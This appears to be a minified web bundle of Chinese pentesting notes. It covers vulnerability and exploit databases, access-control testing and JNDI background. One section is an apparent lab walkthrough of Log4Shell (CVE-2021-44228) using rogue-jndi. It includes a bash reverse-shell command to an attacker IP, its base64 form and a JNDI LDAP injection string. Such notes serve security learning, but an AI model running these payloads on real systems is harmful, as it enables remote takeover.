                                                  \u4E5F\u5C31\u662F\u8BF4\uFF0C\u8FD8\u662F\u8981\u3010\u5728\u7EBF\u4E0A\u4F20\u3011\u3002

                                  OWASP\uFF0C\u7684\u3010Dependency-Check\u3011\u3002
                                      \u8D44\u6599\uFF1A
                                          https://github.com/jeremylong/DependencyCheck
                                      \u4ECB\u7ECD\uFF1B
                                          \u662FOWASP\uFF08Open Web Application Security Project\uFF09\u7684\u4E00\u4E2A\u5B9E\u7528\u5F00\u6E90\u7A0B\u5E8F\uFF0C\u7528\u4E8E\u8BC6\u522B\u9879\u76EE\u4F9D\u8D56\u9879\u5E76\u68C0\u67E5\u662F\u5426\u5B58\u5728\u4EFB\u4F55\u5DF2\u77E5\u7684\uFF0C\u516C\u5F00\u62AB\u9732\u7684\u6F0F\u6D1E\u3002
                                          \u76EE\u524D\uFF0C\u5DF2\u652F\u6301Java\u3001.NET\u3001Ruby\u3001Node.js\u3001Python\u7B49\u8BED\u8A00\u7F16\u5199\u7684\u7A0B\u5E8F\uFF0C\u5E76\u4E3AC/C++\u6784\u5EFA\u7CFB\u7EDF\uFF08autoconf\u548Ccmake\uFF09\u63D0\u4F9B\u4E86\u6709\u9650\u7684\u652F\u6301\u3002
                                          \u800C\u4E14\u8BE5\u5DE5\u5177\u8FD8\u662FOWASP Top 10\u7684\u89E3\u51B3\u65B9\u6848\u7684\u4E00\u90E8\u5206\u3002
                                      \u4F7F\u7528\uFF1A
                                          \u4F5C\u4E3A\u4E00\u6B3E\u5F00\u6E90\u5DE5\u5177\uFF0C\u5728\u591A\u5E74\u6765\u7684\u53D1\u5C55\u4E2D\u5DF2\u7ECF\u652F\u6301\u548C\u8BB8\u591A\u4E3B\u6D41\u7684\u8F6F\u4EF6\u8FDB\u884C\u96C6\u6210\uFF0C\u6BD4\u5982\uFF1A\u547D\u4EE4\u884C\u3001Ant\u3001Maven\u3001Gradle\u3001Jenkins\u3001Sonar\u7B49\u3002

                              5.
                              \u88F8\u626B\u3010\u9879\u76EE\u4F9D\u8D56\u6587\u4EF6\u3011
                                  \u6536\u8D39\uFF1A
                                      \u5947\u5B89\u4FE1\u4EE3\u7801\u536B\u58EB\u3002
                                          \u53EF\u60DC\u4E86\uFF0C\u54EA\u6015\u6536\u8D39\u4E5F\u5F04\u4E0D\u5230\u3002

                          \u901A\u7528\uFF1A
                              1.
                              \u6A21\u7CCA\u7684\uFF0C\u641C\u7D22\u3010\u4EA7\u54C1\u3011+\u3010\u7248\u672C\u53F7\u3011\uFF0C\u5F97\u51FA\u5B8F\u89C2\u7684\u793E\u4F1A\u5DE5\u7A0B\u5B66 \u4FE1\u606F\u3001\u5927\u6570\u636E\u753B\u50CF\u4FE1\u606F
                                  https://vuldb.com/?search.advanced

                              2.
                              \u6BD4\u8F83\u6A21\u7CCA\u7684\u641C\u7D22\uFF0C\u4F46\u6570\u636E\u5E93\u6BD4\u8F83\u5168
                                  https://cve.mitre.org/find/index.html
                                      \u4F7F\u7528\u3010Google\u3011\u68C0\u7D22\u7AD9\u5185\u5185\u5BB9\uFF0C\u6BD4\u8F83\u5168
                                  https://cve.mitre.org/cve/search_cve_list.html
                                      \u53EA\u80FD\u652F\u6301\u3010\u7248\u672C\u6A21\u7CCA\u641C\u7D22\u3011\uFF0C\u5F97\u51FA\u7684\u7248\u672C\u4E0D\u4E00\u5B9A\u7CBE\u786E  \uFF08\u53EF\u80FD\u6709\u8BEF\u62A5\uFF0C\u53EF\u80FD\u6709\u6F0F\u62A5\uFF09
                                          \u641C\u7D22\u65B9\u5F0F\uFF0C\u3010\u4EA7\u54C1 \u7248\u672C\u53F7\u3011

                              3.
                              \u3010cybersecurity-help\u3011
                                  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
                                      \u76F4\u63A5\u501F\u52A9\u3010Google\u3011\u641C\u7D22
                                          \u6F0F\u6D1E\u641C\u7D22\uFF1A\u3010site:cybersecurity-help.cz <\u5173\u952E\u5B57>\u3011
                                          Exp\u641C\u7D22\uFF1A
                                              \u7B2C\u4E00\u79CD\uFF0C\u4ECE\u3010\u6F0F\u6D1E\u8BE6\u60C5\u3011\u7684\u3010Exploit availability\u3011\u8FDB\u53BB
                                              \u7B2C\u4E8C\u79CD\uFF0C\u641C\u7D22\uFF1A\u3010site:cybersecurity-help.cz <\u5173\u952E\u5B57>\u3011
                                          \u516C\u544A\uFF1A
                                              https://www.cybersecurity-help.cz/vdb/SB2021122120
                                  \u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF08\u4E0D\u63A8\u8350\uFF09
                                      https://www.cybersecurity-help.cz/vdb/
                                          \u5229\u7528\u5185\u7F6E\u7684\u641C\u7D22\u529F\u80FD\uFF0C\u4F46\u7ED3\u679C\u5F88\u9E21\u808B

                              4.
                              \u53EF\u80FD\u662F\u53F2\u4E0A\u6700\u8BE6\u7EC6\u7684\u6F0F\u6D1E\u5E93\uFF0C\u4F46\u64CD\u4F5C\u8D77\u6765  \u3010\u624B\u611F\u3001\u65B9\u4FBF\u7A0B\u5EA6\u3011  \u5E76\u4E0D\u662F\u7B2C\u4E00\uFF1A
                                  \u7CBE\u786E\u641C\u7D22\u7B2C\u4E8C\u79CD\uFF1A
                                      https://www.cvedetails.com/vulnerability-list/
                                          \u4F7F\u7528\u65B9\u5F0F\uFF1A
                                              \u9996\u5148\uFF0C\u8F93\u5165\u3010\u4EA7\u54C1 \u7248\u672C\u53F7\u3011  Search \u3002
                                                  \u7ED3\u679C\u4E2D\uFF0C\u7B2C\u4E00\u4E2A\u4E00\u822C\u662F\u3010\u5B89\u5168\u6F0F\u6D1E\u3011
                                              \u8FDB\u5165\u3010\u5B89\u5168\u6F0F\u6D1E\u3011
                                                  \u70B9\u51FB\u3010\u4E0A\u4E00\u7EA7\u3011\uFF0C\u8FDB\u5165\u3010\u6F0F\u6D1E\u6C47\u603B\u7ED3\u679C\u3011
                                                      \u70B9\u51FB\u3010Browse all versions\u3011
                                                          \u7248\u672C\u5206\u6790\uFF1A
                                                              \u90E8\u5206\u662F\u3010\u7CBE\u786E\u7248\u672C\u3011
                                                                  \u6BD4\u8F83\u5C11\u3002
                                                              \u90E8\u5206\u662F\u3010*\u53F7\u6A21\u7CCA\u7248\u672C\u3011
                                                                  \u6BD4\u8F83\u591A
                                                                      \u8BC1\u660E\u4E86\uFF0C\u5176\u5B9E\u3010\u5B98\u65B9\u6743\u5A01\u7F51\u7AD9\u3011\uFF0C\u505A\u7684\u4E5F\u5F88\u591A\u4E0D\u5230\u4F4D\u7684\u5730\u65B9\u3002
                                  \u7CBE\u786E\u641C\u7D22\u7B2C\u4E00\u79CD\uFF1A
                                      \u6309\u3010\u7248\u672C\u53F7\u3011\u7CBE\u786E\u641C\u7D22\uFF0C\u505A\u7684\u5F88\u70C2  \u57FA\u672C\u641C\u4E0D\u5230\u4E1C\u897F\uFF1A
                                          https://www.cvedetails.com/version-search.php

                              5.
                              NVD\u8BE6\u60C5\u641C\u7D22
                                  https://nvd.nist.gov/vuln/search
                                      \u9700\u8981\u8F93\u5165
                                          \u3010Advanced\u9AD8\u7EA7\u641C\u7D22\u3011
                                          \u9012\u8FDB\u8F93\u5165(\u4F1A\u6709\u81EA\u52A8\u63D0\u793A)\uFF1A\u3010CPE Vendor \u63D0\u4F9B\u5546\u3011\u3001\u3010CPE Product \u4EA7\u54C1\u3011\u3001\u3010\u7248\u672C\u53F7\u3011


                          \u5176\u5B83
                              1.
                              \u4E00\u4E2A\u8D77\u540D\u53EB\u65AF\u8BFA\u767B\uFF0C\u770B\u4E0A\u53BB\u4E5F\u975E\u5E38\u795E\u5947\u7684\u7AD9\uFF01\uFF08\u4F46\u662F\uFF0C\u6211\u8FD8\u6CA1\u641E\u61C2\uFF0C\u5B83\u662F\u600E\u4E48\u8FD0\u4F5C\u7684\uFF1F\uFF09
                                  \uFF01\uFF01\uFF01
                                  https://issueantenna.com/repo/snowdensb/nibrs/issues/338

                      \u4E2D\u4EF7\u503C\uFF1A

                          1.
                          \u5F88\u5927\uFF0C\u4F46\u4E0D\u662F\u5F88\u5168
                              \uFF08\u5F88\u5927\u2014\u2014\u2014\u2014\u2014\u2014\u7528\u4E8ESCA\u9759\u6001\u4EE3\u7801\u5206\u6790\uFF09
                              \uFF08\u4E0D\u662F\u5F88\u5168\u2014\u2014\u2014\u2014\u2014\u2014\u3010FastJson\u6F0F\u6D1E\u3011\u591A\u4E2A\u7248\u672C\u7F3A\u5931\uFF09
                                  https://deps.dev/
                                      \u4E3E\u4F8B\uFF1Ahttps://deps.dev/maven/com.alibaba%3Afastjson/1.2.68

                          2.
                          \u6709\u7C7B\u4F3C\u529F\u80FD\uFF0C\u4F46\u6570\u636E\u6BD4\u8F83\u6B8B\u7F3A\uFF1A
                              https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-rce/java/sid-3663
                              https://www.sourceclear.com/vulnerability-database/security/download-hijacking/javascript/sid-3023
                              https://www.sourceclear.com/vulnerability-database/security/sca/vulnerability/sid-20567/summary
                              https://www.sourceclear.com/vulnerability-database/security/authorization-bypass/os/sid-28566

                  `,{isCollapse:!0})]}),Object(u.c)("Jenkins\uFF0C\u5B98\u65B9\u5DF2\u77E5\u6F0F\u6D1E\uFF0C\u6240\u6709\u4E00\u89C8\u5217\u8868\uFF1A",`

                  https://www.jenkins.io/security/advisories/
              `,{isCollapse:!0}))))},{name:"\u3010PoC\u3011\u4FE1\u606F",desc:n.a.createElement(n.a.Fragment,null,`
            \u57FA\u672C\u7684\u4E00\u4E2A\u3010\u6982\u5FF5\u8BC1\u660E\u3011\u3002
            \u8BF4\u660E\u771F\u7684\u662F\u5B58\u5728\u7684

            \u3010\u626B\u63CF\u5668\u3011\u6700\u5728\u610F

          `),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              `))},{name:"\u3010Exp\u3011\u4FE1\u606F",desc:n.a.createElement(n.a.Fragment,null,`
            \u6210\u719F\u7A33\u5B9A\uFF0C\u53EF\u4EE5\u83B7\u5F97shell\u7684

            \u3010\u6E17\u900F\u7EA2\u961F\u3011\u6700\u5728\u610F
          `),steps:[Tu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C,{name:"\u5176\u5B83\u7684\u4E00\u4E9B\u7F51\u7AD9       (\u9646\u7EED\u8865\u5145)",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u641C\u7D22\u5E73\u53F0\u4E00\uFF1A
                      https://sploitus.com/

                  `))}]}]}]},$u=pu,vu=ku,qu=k.e.singleATag_blank,Mu={name:"\u3010\u7F51\u7AD9\u3011_\u3010Http\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u72B6\u6001\u7801\uFF1A
              200
              301
              404
          `))},vu,{name:"\u3010\u654F\u611F\u5185\u5BB9\u3011\u641C\u7D22",desc:n.a.createElement(n.a.Fragment,null),content:Promise.all([f.e(152).then(f.bind(null,"BZJN"))]).then(function(sn){var mn=Object(E.a)(sn,1),Cn=mn[0];return n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                \u5E38\u89C1\u5BFC\u51FA\u65B9\u5F0F\uFF1A
                    \u7B2C\u4E00\u79CD\uFF0C\u624B\u52A8\u590D\u5236\u3010response\u3011
                    \u7B2C\u4E8C\u79CD\uFF0C\u4ECE\u6D4F\u89C8\u5668\u5BFC\u51FA\u3010HAR\u6587\u4EF6\u3011\uFF0C\u7136\u540E\u5168\u6587  \u4E22\u8FDB\u641C\u7D22\u680F\u3002

                `,Cn.\u7F51\u7AD9\u654F\u611F\u5185\u5BB9____\u7591\u96BE\u6742\u75C7_\u641C\u7D22____\u4E8C\u7EA7\u624B\u518C))})}]},_u=Mu,xu=k.e.singleATag_blank,Cu={name:"\u3010\u8D8A\u6743\u3011_\u3010\u672A\u6388\u6743\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())},{name:"\u3010\u6C34\u5E73\u8D8A\u6743\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4FEE\u6539\u3010id\u3011\u5E8F\u53F7

          \u4FEE\u6539\u3010\u7B5B\u9009\u9879\u3011

          `))},{name:"\u3010\u5782\u76F4\u8D8A\u6743\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4FEE\u6539\u3010\u89D2\u8272\u3011
          \u4FEE\u6539\u3010\u6743\u9650\u3011

          \u4FEE\u6539\u3010\u677F\u5757\u3011
              \u5E38\u89C1\u677F\u5757
                  \u4E0A\u4F20
                      upload\u3001_upload
                      uploads\u3001_uploads



          `))},{name:"\u3010\u4E0A\u4E0B\u6587\u8D8A\u6743\u3011 / \u3010\u4E0A\u4E0B\u6587\u3011\u76F8\u5173",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},zu=Cu,Lu=k.e.singleATag_blank,Xu={name:"\u3010\u6587\u4EF6\u4E0A\u4F20\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E())}]},Ju=Xu,Nu=f("2jYT"),Yu=f("+/qY"),on=k.e.singleATag_blank,ou={name:"\u3010rogue-jndi\u3011 / \u3010RogueJndi\u3011",desc:n.a.createElement(n.a.Fragment,null),steps:[{name:"\u73AF\u5883\u51C6\u5907",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
  \u51C6\u5907Java\u7684payload\uFF0C\u6267\u884CRCE
      apt-get  update
      apt-get  install  openjdk-11-jdk
      apt-get  install  maven
              `))},{name:"\u653B\u51FB\u3010CVE-2021-44228\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

      \u4F7F\u7528\u3010rogue-jndi\u3011\u7684Java\u5E94\u7528\uFF0C\u542F\u52A8\u3010\u672C\u5730LDAP\u670D\u52A1\u5668\u3011
          \u4E0B\u8F7D\u4ED3\u5E93\uFF1A\u3010git clone https://github.com/veracode-research/rogue-jndi\u3011
          \u6253\u5305\uFF1A\u3010mvn package\u3011
              \u751F\u6210\u7684jar\u5305\uFF1A
                  \u3010./target/RogueJndi-1.1.jar\u3011

          \u4F20\u5165payload
              \u6211\u4EEC\u4F7F\u7528\u3010base64\u3011\u7F16\u7801\uFF0C\u6765\u907F\u514D\u4E00\u5207\u7F16\u7801\u5F15\u8D77\u7684\u95EE\u9898\uFF1A
                  echo  'bash  -c  bash  -i  >&/dev/tcp/<\u4F60\u7684\u7F51\u5361IP>/<\u4F60\u81EA\u5DF1\u4EFB\u9009\u4E00\u4E2A\u7AEF\u53E3>  0>&1  ' | base64

                      \u3010| base64\u3011\uFF0C\u5C06\u3010\u524D\u9762\u5B57\u7B26\u3011\u4F20\u5165\u3010base64\u547D\u4EE4\u3011

                      \u4E34\u65F6\u751F\u6210\u4E86\u3010YmFzaCAgLWMgIGJhc2ggIC1pICA+Ji9kZXYvdGNwLzEwLjEwLjE0LjU2Lzk5OTkgIDA+JjEgIAo=\u3011

              \u751F\u6210payload\u540E\uFF0C\u4F20\u5165
                  java  -jar  target/RogueJndi-1.1.jar  --command  "bash  -c  {echo,<base64\u5B57\u7B26\u4E32_\u5916\u9762\u4E0D\u5E26\u5F15\u53F7>}|{base64,-d}|{bash,-i}  "  --hostname  "<\u4F60\u7684\u7F51\u5361IP>"
                      \u6B64\u5904\uFF0C\u8981\u5207\u8BB0\uFF0C\u3010{}|{}|{}\u3011\u8FD9\u6837\u7684\u5F62\u5F0F\uFF1A
                          \u4E2D\u95F4\u4E00\u5B9A\u8981\u3010\u7D27\u8FDE\u3011\uFF0C\u4E0D\u80FD\u6709\u3010\u7A7A\u683C\u3011\uFF1B\u4E0D\u7136\u4F1A\u5931\u8D25  (\u4E3A\u4EC0\u4E48\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F)

                      \u7136\u540E\uFF0C\u5C31\u5B8C\u6210\u4E86\u57FA\u672C\u542F\u52A8\u3002

      \u6267\u884CRCE
          \u5728BurpSuite\u4E2D\uFF0C\u5C06\u3010remember\u53C2\u6570\u3011\uFF0C\u6539\u4E3A\u3010"\${jndi:ldap://<\u4F60\u7684\u7F51\u5361IP>:1389/o=tomcat}"\u3011
              \u6CE8\u610F\uFF0C\u6B64\u5904\u5FC5\u987B\u8FDE\u30101389\u3011\u7AEF\u53E3\u3002

          \u7136\u540E\uFF0C\u5F97\u5230\u4E00\u4E2Ashell
              \u54B1\u4EEC\u8FDB\u884C\u3010\u529F\u80FDshell\u3011\u63D0\u5347

      \u5E38\u89C1\u95EE\u9898\uFF1A
          1. \u3010\u9776\u673AIP\u3011\u53D8\u5316\uFF0C\u6B64\u65F6\u3010BurpSuite\u3011\u7684\u8BF7\u6C42\u4FE1\u606F\uFF0C\u9700\u8981\u91CD\u65B0\u4FEE\u6539
              \u6211\u4E4B\u524D\u72AF\u7684\u9519\u8BEF\uFF0C\u5C31\u662F\u53EA\u6539\u4E86\u3010Host\u3011\uFF1B\u800C\u6CA1\u6709\u6539\u3010Referer\u3011\u3001\u3010Origin\u3011\u3002
              `))}]},Wu={name:"\u3010JNDI\u3011_\u3010LDAP\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7EC4\u5408\u6307\u4EE4
              \u3010"\${jndi:ldap://10.10.14.56/whatever}"\u3011


          \u4E24\u8005\uFF0C\u4E4B\u6240\u4EE5\u5982\u6B64\u91CD\u8981\u3001\u5982\u6B64\u5E38\u89C1\uFF0C\u662F\u56E0\u4E3A\uFF1A
              \u3010log4j2\u3011\u4E2D\uFF0C\u80FD\u591F\u89E3\u6790\u5230\u3010jndi\u534F\u8BAE\u3011

                  \u800C\u3010jndi\u3011\u548C\u3010ldap\u3011\uFF0C\u672C\u8EAB\u5C31\u662F\u3010\u8F7B\u578B\u76EE\u5F55\u534F\u8BAE\u3011\uFF1B\u4E5F\u662F\u7ECF\u5E38\u88AB\u534F\u8BAE\u67E5\u8BE2\u7684\u4E00\u79CD\u534F\u8BAE\u3002
                      \u81F3\u4E8E\u4E3A\u4EC0\u4E48\uFF1F\uFF1F\u6211\u8FD8\u4E0D\u77E5\u9053\uFF1F\uFF1F\uFF1F

                      \u6240\u4EE5\uFF0C\u53D8\u5F97\u6108\u53D1\u773C\u719F

                  lookup\uFF0C\u8FD9\u79CD\u88AB\u770B\u6EE5\u4E86

              \u4E3A\u4EC0\u4E48\u3010SPI\u3011\u548C\u3010jndi\u3011\uFF0C\u4F1A\u51FA\u73B0\u5728\u3010\u65E5\u5FD7\u6846\u67B6\u3011\uFF1F\uFF1F\uFF1F
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/7041353521769218085

                  Java\u7684\u53CD\u5C04\u5F88\u5F3A\u5927\uFF0C\u4F46\u662F\u4E5F\u5F88\u5371\u9669\u3002SPI\u529F\u80FD\u7EE7\u627F\u4E86\u8FD9\u4E2A\u7279\u6027\uFF0C\u52C7\u731B\u7684\u66B4\u9732\u4E86\u5B83\u7684\u5F31\u70B9\u3002\u6211\u89C9\u5F97\u529F\u80FD\u5F88\u597D\u554A\uFF0C\u4F46\u5B83\u4E3A\u4EC0\u4E48\u8981\u5B58\u5728\u4E8E\u65E5\u5FD7\u6846\u67B6\u5462\uFF1F
                      \u8FD9\u53EF\u80FD\u662F\u56E0\u4E3A\u5377\u5427\u3002\u6BD5\u7ADF\u4E00\u4E2A\u65E5\u5FD7\u6846\u67B6\uFF0C\u4E5F\u662F\u8981\u6709\u5143\u5B87\u5B99\u7684\u68A6\u60F3\u7684\uFF01
                          \u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026

              \u4E00\u4E9B\u626B\u76F2\uFF1A
                  \u8D44\u6599\uFF1A
                      https://juejin.cn/post/7041353521769218085

                  \u5F88\u591A\u4EBA\u63A5\u89E6JNDI\uFF0C\u662F\u4ECE\u6570\u636E\u5E93\u7684\u9A71\u52A8\u5F00\u59CB\u7684\u3002
                      \u5F53\u7136\uFF0C\u968F\u7740SpringBoot\u5355\u4F53\u53D1\u5E03\u6A21\u5F0F\u7684\u6D41\u884C\uFF0C\u73B0\u5728\u7528\u8FD9\u79CD\u65B9\u5F0F\u6765\u83B7\u53D6\u6570\u636E\u5E93\u914D\u7F6E\u7684\u53E4\u8463\u516C\u53F8\uFF0C\u662F\u8D8A\u6765\u8D8A\u5C11\u4E86\u3002

                      \u4E60\u60EF\u7528\u300Axml\u300B\u7684\u3010<Resource>\u3011\u6807\u7B7E\uFF0C\u53BB\u8FDB\u884C\u52A0\u8F7D

                  \u66F4\u591A\u62D3\u5C55\uFF0CJNDI\u901A\u8FC7SPI\u673A\u5236\uFF0C\u53EF\u4EE5\u548CLDAP\u3001RMI\u7B49\u5404\u79CD\u6280\u672F\uFF0C\u4EA7\u751F\u8054\u52A8\u3002
                      \u3010SPI\u673A\u5236\u3011
                          SPI\u662F\u4E3A\u6570\u4E0D\u591A\u7684\u6253\u7834Java\u7C7B\u52A0\u8F7D\u673A\u5236\u7684\u6280\u672F\uFF0C\u548CUnsafe\u7C7B\u4E00\u6837\uFF0C\u5F3A\u5927\u4F46\u5E76\u4E0D\u90A3\u4E48\u63A8\u8350\u4F7F\u7528\u3002
                              \u4E3E\u4F8B\uFF1A
                                  \u5C31\u662FNamingManager\u7C7B\u91CC\u9762\u7684\u65B9\u6CD5getObjectFactoryFromReference\u3002
                                      \u5F53\u5B83\u4ECE\u672C\u5730\u52A0\u8F7D\u76F8\u5E94\u7C7B\u7684\u65F6\u5019\uFF0C\u5982\u679C\u52A0\u8F7D\u4E0D\u5230\uFF0C\u5B83\u5E72\u4E86\u4E00\u4EF6\u4E0D\u8BE5\u5E72\u4F46\u53C8\u4E0D\u5F97\u4E0D\u5E72\u7684\u4E8B\u60C5\uFF0C
                                          \u90A3\u5C31\u662F\u4ECE\u7F51\u7EDC\u4E0A\u7684\u4EE3\u7801\u91CC\u9762\u6784\u9020\u76F8\u5E94\u7684\u5BF9\u8C61\uFF01

          `))},{name:"\u3010JNDI\u3011",desc:n.a.createElement(n.a.Fragment,null),content:n.a.createElement(n.a.Fragment,null,u.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          JNDI
              Java Naming and Directory Interface API .

              \u901A\u8FC7\u8C03\u7528\u6B64 API\uFF0C\u5E94\u7528\u7A0B\u5E8F\u53EF\u4EE5\u5B9A\u4F4D\u8D44\u6E90\u548C\u5176\u4ED6\u7A0B\u5E8F\u5BF9\u8C61\u3002
                  \u8D44\u6E90\u662F\u63D0\u4F9B\u4E0E\u7CFB\u7EDF\uFF08\u4F8B\u5982\u6570\u636E\u5E93\u670D\u52A1\u5668\u548C\u6D88\u606F\u4F20\u9012\u7CFB\u7EDF\uFF09\u7684\u8FDE\u63A5\u7684\u7A0B\u5E8F\u5BF9\u8C61\u3002

          \u57FA\u672C\u4F5C\u7528\uFF1A
              JNDI \u5B9E\u73B0\u4F9D\u8D56\u67E5\u627E\uFF0C\u5B9E\u73B0\u4E00\u4E2A\u6700\u7B80\u5355spring
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/7006965713491460126

              \u5386\u53F2\u51FA\u73B0\u7684\u539F\u56E0\uFF1A
                  \u8D44\u6599\uFF1Ahttps://juejin.cn/post/6844903917994639368

                  Sun\u5236\u5B9A\u4E86\u3010J2EE\u3011\u89C4\u8303\uFF1A
                      J2EE \u89C4\u8303\u8981\u6C42\u5168\u90E8 J2EE \u5BB9\u5668\u90FD\u8981\u63D0\u4F9B JNDI \u89C4\u8303\u7684\u5B9E\u73B0\u3002
                          //sun \u679C\u7136\u559C\u6B22\u5236\u5B9A\u89C4\u8303
                      JNDI \u5728 J2EE \u4E2D\u7684\u89D2\u8272\u5C31\u662F\u201C\u4EA4\u6362\u673A\u201D \u2014\u2014 J2EE \u7EC4\u4EF6\u5728\u6267\u884C\u65F6\u95F4\u63A5\u5730\u67E5\u627E\u5176\u5B83\u7EC4\u4EF6\u3001\u8D44\u6E90\u6216\u670D\u52A1\u7684\u901A\u7528\u673A\u5236\u3002
                      \u5728\u591A\u6570\u60C5\u51B5\u4E0B\uFF0C\u63D0\u4F9B JNDI \u4F9B\u5E94\u8005\u7684\u5BB9\u5668\u80FD\u591F\u5145\u5F53\u6709\u9650\u7684\u6570\u636E\u5B58\u50A8\u3002
                          \u8FD9\u6837\u7BA1\u7406\u5458\u5C31\u80FD\u591F\u8BBE\u7F6E\u5E94\u7528\u7A0B\u5E8F\u7684\u6267\u884C\u5C5E\u6027\uFF0C\u5E76\u8BA9\u5176\u5B83\u5E94\u7528\u7A0B\u5E8F\u5F15\u7528\u8FD9\u4E9B\u5C5E\u6027\uFF08Java \u7BA1\u7406\u6269\u5C55\uFF08Java Management Extensions\uFF0CJMX\uFF09\u4E5F\u80FD\u591F\u7528\u4F5C\u8FD9\u4E2A\u76EE\u7684\uFF09\u3002
                      JNDI \u5728 J2EE \u5E94\u7528\u7A0B\u5E8F\u4E2D\u7684\u4E3B\u8981\u89D2\u8272\u5C31\u662F\u63D0\u4F9B\u95F4\u63A5\u5C42\uFF0C
                          \u8FD9\u6837\u7EC4\u4EF6\u5C31\u80FD\u591F\u53D1\u73B0\u6240\u987B\u8981\u7684\u8D44\u6E90\uFF0C\u800C\u4E0D\u7528\u4E86\u89E3\u8FD9\u4E9B\u95F4\u63A5\u6027\u3002
                      \u5728 J2EE \u4E2D\uFF0CJNDI \u662F\u628A J2EE \u5E94\u7528\u7A0B\u5E8F\u5408\u5728\u4E00\u8D77\u7684\u7C98\u5408\u5242\u3002
                          JNDI \u63D0\u4F9B\u7684\u95F4\u63A5\u5BFB\u5740\u540C\u610F\u8DE8\u4F01\u4E1A\u4EA4\u4ED8\u53EF\u4F38\u7F29\u7684\u3001\u529F\u80FD\u5F3A\u5927\u4E14\u975E\u5E38\u7075\u6D3B\u7684\u5E94\u7528\u7A0B\u5E8F\u3002
                          \u8FD9\u662F J2EE \u7684\u627F\u8BFA\uFF0C\u5E76\u4E14\u7ECF\u8FC7\u4E00\u4E9B\u8BA1\u5212\u548C\u9884\u5148\u8003\u8651\u3002\u8FD9\u4E2A\u627F\u8BFA\u662F\u5168\u7136\u80FD\u591F\u5B9E\u73B0\u7684\u3002
                  \u6211\u4EEC\u7684\u7406\u89E3\uFF1A
                      JNDI \u63D0\u51FA\u7684\u76EE\u7684\u662F\u4E3A\u4E86\u89E3\u85D5\uFF0C\u662F\u4E3A\u4E86\u5F00\u53D1\u66F4\u52A0easy\u7EF4\u62A4\uFF0Ceasy\u6269\u5C55\u3002easy\u90E8\u7F72\u7684\u5E94\u7528\u3002
                      JNDI \u662F\u4E00\u4E2Asun\u63D0\u51FA\u7684\u4E00\u4E2A\u89C4\u8303(\u76F8\u4F3C\u4E8Ejdbc),\u8BE6\u7EC6\u7684\u5B9E\u73B0\u662F\u5404\u4E2Aj2ee\u5BB9\u5668\u63D0\u4F9B\u5546\u3002sun   \u4EC5\u4EC5\u662F\u8981\u6C42\uFF0Cj2ee\u5BB9\u5668\u5FC5\u987B\u6709JNDI\u8FD9\u79CD\u529F\u80FD\u3002
